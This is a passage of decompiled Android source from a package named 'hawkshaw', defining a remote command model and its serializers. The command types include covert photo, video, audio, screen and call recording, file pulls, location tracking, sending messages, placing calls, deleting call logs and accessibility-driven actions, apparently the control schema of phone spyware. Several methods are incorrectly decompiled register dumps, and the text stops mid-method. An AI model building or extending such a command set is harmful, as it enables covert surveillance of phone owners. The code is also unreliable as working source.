        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$ThumbnailRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ ThumbnailRequest(int i5, List list2, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.list = list2;
            } else {
                w.x(i5, 1, Command$ThumbnailRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getList$annotations() {
        }

        public final List<String> getList() {
            return this.list;
        }

        public ThumbnailRequest(List<String> list2) {
            this.list = list2;
        }
    }

    public /* synthetic */ Command(int i5, CommandType commandType, long j5, ThumbnailRequest thumbnailRequest2, FileRequest fileRequest2, FilesRequest filesRequest2, DeletePendingPushFilesRequest deletePendingPushFilesRequest2, DeleteFileRequest deleteFileRequest2, AddCallLogRequest addCallLogRequest2, DeleteCallLogRequest deleteCallLogRequest2, AddContactRequest addContactRequest2, DeleteContactRequest deleteContactRequest2, SendMessageRequest sendMessageRequest2, GetLocationRequest getLocationRequest2, VibrateRequest vibrateRequest2, FlashRequest flashRequest2, TakePictureRequest takePictureRequest2, RecordVideoRequest recordVideoRequest2, RecordAudioRequest recordAudioRequest2, PushDeviceInfoRequest pushDeviceInfoRequest, OpenAppRequest openAppRequest2, MakeCallRequest makeCallRequest2, DeviceAudioRequest deviceAudioRequest, OpenDeeplinkRequest openDeeplinkRequest2, LoginRequest loginRequest2, ScheduleCommandRequest scheduleCommandRequest2, CancelScheduledCommandRequest cancelScheduledCommandRequest2, AccessibilityCommandRequest accessibilityCommandRequest2, StartRepeatPushDataRequest startRepeatPushDataRequest2, SetDynamicConfigRequest setDynamicConfigRequest2, SyncAppConfigRequest syncAppConfigRequest2, q0 q0Var) {
        CommandType commandType2;
        long j6;
        int i6 = i5;
        if ((i6 & 1) == 0) {
            commandType2 = CommandType.Unknown;
        } else {
            commandType2 = commandType;
        }
        this.type = commandType2;
        if ((i6 & 2) == 0) {
            j6 = System.currentTimeMillis();
        } else {
            j6 = j5;
        }
        this.sentTime = j6;
        if ((i6 & 4) == 0) {
            this.thumbnailRequest = null;
        } else {
            this.thumbnailRequest = thumbnailRequest2;
        }
        if ((i6 & 8) == 0) {
            this.fileRequest = null;
        } else {
            this.fileRequest = fileRequest2;
        }
        if ((i6 & 16) == 0) {
            this.filesRequest = null;
        } else {
            this.filesRequest = filesRequest2;
        }
        if ((i6 & 32) == 0) {
            this.deletePendingPushFilesRequest = null;
        } else {
            this.deletePendingPushFilesRequest = deletePendingPushFilesRequest2;
        }
        if ((i6 & 64) == 0) {
            this.deleteFileRequest = null;
        } else {
            this.deleteFileRequest = deleteFileRequest2;
        }
        if ((i6 & 128) == 0) {
            this.addCallLogRequest = null;
        } else {
            this.addCallLogRequest = addCallLogRequest2;
        }
        if ((i6 & 256) == 0) {
            this.deleteCallLogRequest = null;
        } else {
            this.deleteCallLogRequest = deleteCallLogRequest2;
        }
        if ((i6 & NotificationCompat.FLAG_GROUP_SUMMARY) == 0) {
            this.addContactRequest = null;
        } else {
            this.addContactRequest = addContactRequest2;
        }
        if ((i6 & 1024) == 0) {
            this.deleteContactRequest = null;
        } else {
            this.deleteContactRequest = deleteContactRequest2;
        }
        if ((i6 & 2048) == 0) {
            this.sendMessageRequest = null;
        } else {
            this.sendMessageRequest = sendMessageRequest2;
        }
        if ((i6 & NotificationCompat.FLAG_BUBBLE) == 0) {
            this.getLocationRequest = null;
        } else {
            this.getLocationRequest = getLocationRequest2;
        }
        if ((i6 & 8192) == 0) {
            this.vibrateRequest = null;
        } else {
            this.vibrateRequest = vibrateRequest2;
        }
        if ((i6 & 16384) == 0) {
            this.flashRequest = null;
        } else {
            this.flashRequest = flashRequest2;
        }
        if ((32768 & i6) == 0) {
            this.takePictureRequest = null;
        } else {
            this.takePictureRequest = takePictureRequest2;
        }
        if ((65536 & i6) == 0) {
            this.recordVideoRequest = null;
        } else {
            this.recordVideoRequest = recordVideoRequest2;
        }
        if ((131072 & i6) == 0) {
            this.recordAudioRequest = null;
        } else {
            this.recordAudioRequest = recordAudioRequest2;
        }
        if ((262144 & i6) == 0) {
            this.deviceInfoRequest = null;
        } else {
            this.deviceInfoRequest = pushDeviceInfoRequest;
        }
        if ((524288 & i6) == 0) {
            this.openAppRequest = null;
        } else {
            this.openAppRequest = openAppRequest2;
        }
        if ((1048576 & i6) == 0) {
            this.makeCallRequest = null;
        } else {
            this.makeCallRequest = makeCallRequest2;
        }
        if ((2097152 & i6) == 0) {
            this.setDeviceAudioRequest = null;
        } else {
            this.setDeviceAudioRequest = deviceAudioRequest;
        }
        if ((4194304 & i6) == 0) {
            this.openDeeplinkRequest = null;
        } else {
            this.openDeeplinkRequest = openDeeplinkRequest2;
        }
        if ((8388608 & i6) == 0) {
            this.loginRequest = null;
        } else {
            this.loginRequest = loginRequest2;
        }
        if ((16777216 & i6) == 0) {
            this.scheduleCommandRequest = null;
        } else {
            this.scheduleCommandRequest = scheduleCommandRequest2;
        }
        if ((33554432 & i6) == 0) {
            this.cancelScheduledCommandRequest = null;
        } else {
            this.cancelScheduledCommandRequest = cancelScheduledCommandRequest2;
        }
        if ((67108864 & i6) == 0) {
            this.accessibilityCommandRequest = null;
        } else {
            this.accessibilityCommandRequest = accessibilityCommandRequest2;
        }
        if ((134217728 & i6) == 0) {
            this.startRepeatPushDataRequest = null;
        } else {
            this.startRepeatPushDataRequest = startRepeatPushDataRequest2;
        }
        if ((268435456 & i6) == 0) {
            this.setDynamicConfigRequest = null;
        } else {
            this.setDynamicConfigRequest = setDynamicConfigRequest2;
        }
        if ((i6 & 536870912) == 0) {
            this.syncAppConfigRequest = null;
        } else {
            this.syncAppConfigRequest = syncAppConfigRequest2;
        }
    }

    @f
    public static final class FileRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, Source.Companion.serializer(), Medium.Companion.serializer(), null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final int buffer;
        private final Medium medium;
        private final String path;
        private final Source source;
        private final boolean zip;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$FileRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum Medium {
            Tus,
            Grpc;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Medium.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Medium[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, e.f4889D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        @f
        public enum Source {
            CameraImage,
            VideoRecording,
            AudioRecording,
            Screenshot,
            ScreenRecording,
            FileExplorer,
            CallRecording;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Source.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Source[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, f.f4890D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public /* synthetic */ FileRequest(int i5, String str, Source source2, Medium medium2, int i6, boolean z4, q0 q0Var) {
            if (3 == (i5 & 3)) {
                this.path = str;
                this.source = source2;
                if ((i5 & 4) == 0) {
                    this.medium = Medium.Grpc;
                } else {
                    this.medium = medium2;
                }
                if ((i5 & 8) == 0) {
                    this.buffer = 1048576;
                } else {
                    this.buffer = i6;
                }
                if ((i5 & 16) == 0) {
                    this.zip = false;
                } else {
                    this.zip = z4;
                }
            } else {
                w.x(i5, 3, Command$FileRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ FileRequest copy$default(FileRequest fileRequest, String str, Source source2, Medium medium2, int i5, boolean z4, int i6, Object obj) {
            if ((i6 & 1) != 0) {
                str = fileRequest.path;
            }
            if ((i6 & 2) != 0) {
                source2 = fileRequest.source;
            }
            Source source3 = source2;
            if ((i6 & 4) != 0) {
                medium2 = fileRequest.medium;
            }
            Medium medium3 = medium2;
            if ((i6 & 8) != 0) {
                i5 = fileRequest.buffer;
            }
            int i7 = i5;
            if ((i6 & 16) != 0) {
                z4 = fileRequest.zip;
            }
            return fileRequest.copy(str, source3, medium3, i7, z4);
        }

        public static /* synthetic */ void getBuffer$annotations() {
        }

        public static /* synthetic */ void getMedium$annotations() {
        }

        public static /* synthetic */ void getPath$annotations() {
        }

        public static /* synthetic */ void getSource$annotations() {
        }

        public static /* synthetic */ void getZip$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(FileRequest fileRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            q qVar = (q) bVar;
            qVar.f0(serialDescriptor, 0, fileRequest.path);
            qVar.e0(serialDescriptor, 1, kSerializerArr[1], fileRequest.source);
            if (qVar.q(serialDescriptor) || fileRequest.medium != Medium.Grpc) {
                qVar.e0(serialDescriptor, 2, kSerializerArr[2], fileRequest.medium);
            }
            if (qVar.q(serialDescriptor) || fileRequest.buffer != 1048576) {
                qVar.c0(3, fileRequest.buffer, serialDescriptor);
            }
            if (qVar.q(serialDescriptor) || fileRequest.zip) {
                qVar.X(serialDescriptor, 4, fileRequest.zip);
            }
        }

        public final String component1() {
            return this.path;
        }

        public final Source component2() {
            return this.source;
        }

        public final Medium component3() {
            return this.medium;
        }

        public final int component4() {
            return this.buffer;
        }

        public final boolean component5() {
            return this.zip;
        }

        public final FileRequest copy(String str, Source source2, Medium medium2, int i5, boolean z4) {
            K.n(str, "path");
            K.n(source2, "source");
            K.n(medium2, "medium");
            return new FileRequest(str, source2, medium2, i5, z4);
        }

        public boolean equals(Object obj) {
            if (this == obj) {
                return true;
            }
            if (!(obj instanceof FileRequest)) {
                return false;
            }
            FileRequest fileRequest = (FileRequest) obj;
            return K.f(this.path, fileRequest.path) && this.source == fileRequest.source && this.medium == fileRequest.medium && this.buffer == fileRequest.buffer && this.zip == fileRequest.zip;
        }

        public final int getBuffer() {
            return this.buffer;
        }

        public final Medium getMedium() {
            return this.medium;
        }

        public final String getPath() {
            return this.path;
        }

        public final Source getSource() {
            return this.source;
        }

        public final boolean getZip() {
            return this.zip;
        }

        public int hashCode() {
            int hashCode = this.source.hashCode();
            int hashCode2 = this.medium.hashCode();
            int hashCode3 = Integer.hashCode(this.buffer);
            return Boolean.hashCode(this.zip) + ((hashCode3 + ((hashCode2 + ((hashCode + (this.path.hashCode() * 31)) * 31)) * 31)) * 31);
        }

        public String toString() {
            String str = this.path;
            Source source2 = this.source;
            Medium medium2 = this.medium;
            int i5 = this.buffer;
            boolean z4 = this.zip;
            return "FileRequest(path=" + str + ", source=" + source2 + ", medium=" + medium2 + ", buffer=" + i5 + ", zip=" + z4 + ")";
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ FileRequest(String str, Source source2, Medium medium2, int i5, boolean z4, int i6, j3.f fVar) {
            this(str, source2, (i6 & 4) != 0 ? Medium.Grpc : medium2, (i6 & 8) != 0 ? 1048576 : i5, (i6 & 16) != 0 ? false : z4);
        }

        public FileRequest(String str, Source source2, Medium medium2, int i5, boolean z4) {
            K.n(str, "path");
            K.n(source2, "source");
            K.n(medium2, "medium");
            this.path = str;
            this.source = source2;
            this.medium = medium2;
            this.buffer = i5;
            this.zip = z4;
        }
    }

    @f
    public static final class FilesRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {new C0020d(u0.f536a, 0), FileRequest.Source.Companion.serializer(), FileRequest.Medium.Companion.serializer(), null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final int buffer;
        private final FileRequest.Medium medium;
        private final List<String> paths;
        private final FileRequest.Source source;
        private final boolean zip;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$FilesRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ FilesRequest(int i5, List list, FileRequest.Source source2, FileRequest.Medium medium2, int i6, boolean z4, q0 q0Var) {
            if (3 == (i5 & 3)) {
                this.paths = list;
                this.source = source2;
                if ((i5 & 4) == 0) {
                    this.medium = FileRequest.Medium.Grpc;
                } else {
                    this.medium = medium2;
                }
                if ((i5 & 8) == 0) {
                    this.buffer = 1048576;
                } else {
                    this.buffer = i6;
                }
                if ((i5 & 16) == 0) {
                    this.zip = false;
                } else {
                    this.zip = z4;
                }
            } else {
                w.x(i5, 3, Command$FilesRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getBuffer$annotations() {
        }

        public static /* synthetic */ void getMedium$annotations() {
        }

        public static /* synthetic */ void getPaths$annotations() {
        }

        public static /* synthetic */ void getSource$annotations() {
        }

        public static /* synthetic */ void getZip$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(FilesRequest filesRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            q qVar = (q) bVar;
            qVar.e0(serialDescriptor, 0, kSerializerArr[0], filesRequest.paths);
            qVar.e0(serialDescriptor, 1, kSerializerArr[1], filesRequest.source);
            if (qVar.q(serialDescriptor) || filesRequest.medium != FileRequest.Medium.Grpc) {
                qVar.e0(serialDescriptor, 2, kSerializerArr[2], filesRequest.medium);
            }
            if (qVar.q(serialDescriptor) || filesRequest.buffer != 1048576) {
                qVar.c0(3, filesRequest.buffer, serialDescriptor);
            }
            if (qVar.q(serialDescriptor) || filesRequest.zip) {
                qVar.X(serialDescriptor, 4, filesRequest.zip);
            }
        }

        public final int getBuffer() {
            return this.buffer;
        }

        public final FileRequest.Medium getMedium() {
            return this.medium;
        }

        public final List<String> getPaths() {
            return this.paths;
        }

        public final FileRequest.Source getSource() {
            return this.source;
        }

        public final boolean getZip() {
            return this.zip;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ FilesRequest(List list, FileRequest.Source source2, FileRequest.Medium medium2, int i5, boolean z4, int i6, j3.f fVar) {
            this(list, source2, (i6 & 4) != 0 ? FileRequest.Medium.Grpc : medium2, (i6 & 8) != 0 ? 1048576 : i5, (i6 & 16) != 0 ? false : z4);
        }

        public FilesRequest(List<String> list, FileRequest.Source source2, FileRequest.Medium medium2, int i5, boolean z4) {
            K.n(list, "paths");
            K.n(source2, "source");
            K.n(medium2, "medium");
            this.paths = list;
            this.source = source2;
            this.medium = medium2;
            this.buffer = i5;
            this.zip = z4;
        }
    }

    @f
    public static final class FlashRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, Facing.Companion.serializer()};
        public static final Companion Companion = new Companion((j3.f) null);
        private final Facing facing;
        private final long[] timings;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$FlashRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum Facing {
            Back,
            Front;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Facing.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Facing[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, g.f4891D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public /* synthetic */ FlashRequest(int i5, long[] jArr, Facing facing2, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.timings = jArr;
                if ((i5 & 2) == 0) {
                    this.facing = Facing.Back;
                } else {
                    this.facing = facing2;
                }
            } else {
                w.x(i5, 1, Command$FlashRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getFacing$annotations() {
        }

        public static /* synthetic */ void getTimings$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(FlashRequest flashRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            q qVar = (q) bVar;
            qVar.e0(serialDescriptor, 0, U.f465c, flashRequest.timings);
            if (qVar.q(serialDescriptor) || flashRequest.facing != Facing.Back) {
                qVar.e0(serialDescriptor, 1, kSerializerArr[1], flashRequest.facing);
            }
        }

        public final Facing getFacing() {
            return this.facing;
        }

        public final long[] getTimings() {
            return this.timings;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ FlashRequest(long[] jArr, Facing facing2, int i5, j3.f fVar) {
            this(jArr, (i5 & 2) != 0 ? Facing.Back : facing2);
        }

        public FlashRequest(long[] jArr, Facing facing2) {
            K.n(jArr, "timings");
            K.n(facing2, "facing");
            this.timings = jArr;
            this.facing = facing2;
        }
    }

    @f
    public static final class VibrateRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final int[] amplitudes;
        private final boolean flash;
        private final int repeat;
        private final long[] timings;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$VibrateRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ VibrateRequest(int i5, long[] jArr, int[] iArr, int i6, boolean z4, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.timings = jArr;
                if ((i5 & 2) == 0) {
                    int length = jArr.length;
                    int[] iArr2 = new int[length];
                    for (int i7 = 0; i7 < length; i7++) {
                        iArr2[i7] = i7 % 2 == 0 ? 0 : -1;
                    }
                    this.amplitudes = iArr2;
                } else {
                    this.amplitudes = iArr;
                }
                if ((i5 & 4) == 0) {
                    this.repeat = -1;
                } else {
                    this.repeat = i6;
                }
                if ((i5 & 8) == 0) {
                    this.flash = false;
                } else {
                    this.flash = z4;
                }
            } else {
                w.x(i5, 1, Command$VibrateRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getAmplitudes$annotations() {
        }

        public static /* synthetic */ void getFlash$annotations() {
        }

        public static /* synthetic */ void getRepeat$annotations() {
        }

        public static /* synthetic */ void getTimings$annotations() {
        }

        /* JADX WARNING: Code restructure failed: missing block: B:10:0x002c, code lost:*/
            if (Y1.K.f(r0, r4) == false) goto L_0x002e;
         
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public static final /* synthetic */ void write$Self$library_release(com.hawkshaw.library.datalayer.models.Command.VibrateRequest r7, D3.b r8, kotlinx.serialization.descriptors.SerialDescriptor r9) {
            
                E3.U r0 = E3.U.f465c
                long[] r1 = r7.timings
                p3.q r8 = (p3.q) r8
                r2 = 0
                r8.e0(r9, r2, r0, r1)
                boolean r0 = r8.q(r9)
                r1 = -1
                if (r0 == 0) goto L_0x0012
                goto L_0x002e
            L_0x0012:
                int[] r0 = r7.amplitudes
                long[] r3 = r7.timings
                int r3 = r3.length
                int[] r4 = new int[r3]
                r5 = r2
            L_0x001a:
                if (r5 >= r3) goto L_0x0028
                int r6 = r5 % 2
                if (r6 != 0) goto L_0x0022
                r6 = r2
                goto L_0x0023
            L_0x0022:
                r6 = r1
            L_0x0023:
                r4[r5] = r6
                int r5 = r5 + 1
                goto L_0x001a
            L_0x0028:
                boolean r0 = Y1.K.f(r0, r4)
                if (r0 != 0) goto L_0x0036
            L_0x002e:
                E3.N r0 = E3.N.f455c
                int[] r2 = r7.amplitudes
                r3 = 1
                r8.e0(r9, r3, r0, r2)
            L_0x0036:
                boolean r0 = r8.q(r9)
                if (r0 == 0) goto L_0x003d
                goto L_0x0041
            L_0x003d:
                int r0 = r7.repeat
                if (r0 == r1) goto L_0x0047
            L_0x0041:
                int r0 = r7.repeat
                r1 = 2
                r8.c0(r1, r0, r9)
            L_0x0047:
                boolean r0 = r8.q(r9)
                if (r0 == 0) goto L_0x004e
                goto L_0x0052
            L_0x004e:
                boolean r0 = r7.flash
                if (r0 == 0) goto L_0x0058
            L_0x0052:
                boolean r7 = r7.flash
                r0 = 3
                r8.X(r9, r0, r7)
            L_0x0058:
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.VibrateRequest.write$Self$library_release(com.hawkshaw.library.datalayer.models.Command$VibrateRequest, D3.b, kotlinx.serialization.descriptors.SerialDescriptor):void");
        }

        public final int[] getAmplitudes() {
            return this.amplitudes;
        }

        public final boolean getFlash() {
            return this.flash;
        }

        public final int getRepeat() {
            return this.repeat;
        }

        public final long[] getTimings() {
            return this.timings;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ VibrateRequest(long[] r5, int[] r6, int r7, boolean r8, int r9, j3.f r10) {
            
                r4 = this;
                r10 = r9 & 2
                r0 = -1
                r1 = 0
                if (r10 == 0) goto L_0x0019
                int r6 = r5.length
                int[] r10 = new int[r6]
                r2 = r1
            L_0x000a:
                if (r2 >= r6) goto L_0x0018
                int r3 = r2 % 2
                if (r3 != 0) goto L_0x0012
                r3 = r1
                goto L_0x0013
            L_0x0012:
                r3 = r0
            L_0x0013:
                r10[r2] = r3
                int r2 = r2 + 1
                goto L_0x000a
            L_0x0018:
                r6 = r10
            L_0x0019:
                r10 = r9 & 4
                if (r10 == 0) goto L_0x001e
                r7 = r0
            L_0x001e:
                r9 = r9 & 8
                if (r9 == 0) goto L_0x0023
                r8 = r1
            L_0x0023:
                r4.<init>(r5, r6, r7, r8)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.VibrateRequest.<init>(long[], int[], int, boolean, int, j3.f):void");
        }

        public VibrateRequest(long[] jArr, int[] iArr, int i5, boolean z4) {
            K.n(jArr, "timings");
            K.n(iArr, "amplitudes");
            this.timings = jArr;
            this.amplitudes = iArr;
            this.repeat = i5;
            this.flash = z4;
        }
    }

    /* JADX WARNING: Illegal instructions before constructor call */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public /* synthetic */ Command(com.hawkshaw.library.datalayer.models.Command.CommandType r32, long r33, com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest r35, com.hawkshaw.library.datalayer.models.Command.FileRequest r36, com.hawkshaw.library.datalayer.models.Command.FilesRequest r37, com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest r38, com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest r39, com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest r40, com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest r41, com.hawkshaw.library.datalayer.models.Command.AddContactRequest r42, com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest r43, com.hawkshaw.library.datalayer.models.Command.SendMessageRequest r44, com.hawkshaw.library.datalayer.models.Command.GetLocationRequest r45, com.hawkshaw.library.datalayer.models.Command.VibrateRequest r46, com.hawkshaw.library.datalayer.models.Command.FlashRequest r47, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest r48, com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest r49, com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest r50, com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest r51, com.hawkshaw.library.datalayer.models.Command.OpenAppRequest r52, com.hawkshaw.library.datalayer.models.Command.MakeCallRequest r53, com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest r54, com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest r55, com.hawkshaw.library.datalayer.models.Command.LoginRequest r56, com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest r57, com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest r58, com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest r59, com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest r60, com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest r61, com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest r62, int r63, j3.f r64) {
        
            r31 = this;
            r0 = r63
            r1 = r0 & 1
            if (r1 == 0) goto L_0x0009
            com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Unknown
            goto L_0x000b
        L_0x0009:
            r1 = r32
        L_0x000b:
            r2 = r0 & 2
            if (r2 == 0) goto L_0x0014
            long r2 = java.lang.System.currentTimeMillis()
            goto L_0x0016
        L_0x0014:
            r2 = r33
        L_0x0016:
            r4 = r0 & 4
            if (r4 == 0) goto L_0x001c
            r4 = 0
            goto L_0x001e
        L_0x001c:
            r4 = r35
        L_0x001e:
            r6 = r0 & 8
            if (r6 == 0) goto L_0x0024
            r6 = 0
            goto L_0x0026
        L_0x0024:
            r6 = r36
        L_0x0026:
            r7 = r0 & 16
            if (r7 == 0) goto L_0x002c
            r7 = 0
            goto L_0x002e
        L_0x002c:
            r7 = r37
        L_0x002e:
            r8 = r0 & 32
            if (r8 == 0) goto L_0x0034
            r8 = 0
            goto L_0x0036
        L_0x0034:
            r8 = r38
        L_0x0036:
            r9 = r0 & 64
            if (r9 == 0) goto L_0x003c
            r9 = 0
            goto L_0x003e
        L_0x003c:
            r9 = r39
        L_0x003e:
            r10 = r0 & 128(0x80, float:1.8E-43)
            if (r10 == 0) goto L_0x0044
            r10 = 0
            goto L_0x0046
        L_0x0044:
            r10 = r40
        L_0x0046:
            r11 = r0 & 256(0x100, float:3.59E-43)
            if (r11 == 0) goto L_0x004c
            r11 = 0
            goto L_0x004e
        L_0x004c:
            r11 = r41
        L_0x004e:
            r12 = r0 & 512(0x200, float:7.17E-43)
            if (r12 == 0) goto L_0x0054
            r12 = 0
            goto L_0x0056
        L_0x0054:
            r12 = r42
        L_0x0056:
            r13 = r0 & 1024(0x400, float:1.435E-42)
            if (r13 == 0) goto L_0x005c
            r13 = 0
            goto L_0x005e
        L_0x005c:
            r13 = r43
        L_0x005e:
            r14 = r0 & 2048(0x800, float:2.87E-42)
            if (r14 == 0) goto L_0x0064
            r14 = 0
            goto L_0x0066
        L_0x0064:
            r14 = r44
        L_0x0066:
            r15 = r0 & 4096(0x1000, float:5.74E-42)
            if (r15 == 0) goto L_0x006c
            r15 = 0
            goto L_0x006e
        L_0x006c:
            r15 = r45
        L_0x006e:
            r5 = r0 & 8192(0x2000, float:1.148E-41)
            if (r5 == 0) goto L_0x0074
            r5 = 0
            goto L_0x0076
        L_0x0074:
            r5 = r46
        L_0x0076:
            r64 = r5
            r5 = r0 & 16384(0x4000, float:2.2959E-41)
            if (r5 == 0) goto L_0x007e
            r5 = 0
            goto L_0x0080
        L_0x007e:
            r5 = r47
        L_0x0080:
            r16 = 32768(0x8000, float:4.5918E-41)
            r16 = r0 & r16
            if (r16 == 0) goto L_0x008a
            r16 = 0
            goto L_0x008c
        L_0x008a:
            r16 = r48
        L_0x008c:
            r17 = 65536(0x10000, float:9.1835E-41)
            r17 = r0 & r17
            if (r17 == 0) goto L_0x0095
            r17 = 0
            goto L_0x0097
        L_0x0095:
            r17 = r49
        L_0x0097:
            r18 = 131072(0x20000, float:1.83671E-40)
            r18 = r0 & r18
            if (r18 == 0) goto L_0x00a0
            r18 = 0
            goto L_0x00a2
        L_0x00a0:
            r18 = r50
        L_0x00a2:
            r19 = 262144(0x40000, float:3.67342E-40)
            r19 = r0 & r19
            if (r19 == 0) goto L_0x00ab
            r19 = 0
            goto L_0x00ad
        L_0x00ab:
            r19 = r51
        L_0x00ad:
            r20 = 524288(0x80000, float:7.34684E-40)
            r20 = r0 & r20
            if (r20 == 0) goto L_0x00b6
            r20 = 0
            goto L_0x00b8
        L_0x00b6:
            r20 = r52
        L_0x00b8:
            r21 = 1048576(0x100000, float:1.469368E-39)
            r21 = r0 & r21
            if (r21 == 0) goto L_0x00c1
            r21 = 0
            goto L_0x00c3
        L_0x00c1:
            r21 = r53
        L_0x00c3:
            r22 = 2097152(0x200000, float:2.938736E-39)
            r22 = r0 & r22
            if (r22 == 0) goto L_0x00cc
            r22 = 0
            goto L_0x00ce
        L_0x00cc:
            r22 = r54
        L_0x00ce:
            r23 = 4194304(0x400000, float:5.877472E-39)
            r23 = r0 & r23
            if (r23 == 0) goto L_0x00d7
            r23 = 0
            goto L_0x00d9
        L_0x00d7:
            r23 = r55
        L_0x00d9:
            r24 = 8388608(0x800000, float:1.1754944E-38)
            r24 = r0 & r24
            if (r24 == 0) goto L_0x00e2
            r24 = 0
            goto L_0x00e4
        L_0x00e2:
            r24 = r56
        L_0x00e4:
            r25 = 16777216(0x1000000, float:2.3509887E-38)
            r25 = r0 & r25
            if (r25 == 0) goto L_0x00ed
            r25 = 0
            goto L_0x00ef
        L_0x00ed:
            r25 = r57
        L_0x00ef:
            r26 = 33554432(0x2000000, float:9.403955E-38)
            r26 = r0 & r26
            if (r26 == 0) goto L_0x00f8
            r26 = 0
            goto L_0x00fa
        L_0x00f8:
            r26 = r58
        L_0x00fa:
            r27 = 67108864(0x4000000, float:1.5046328E-36)
            r27 = r0 & r27
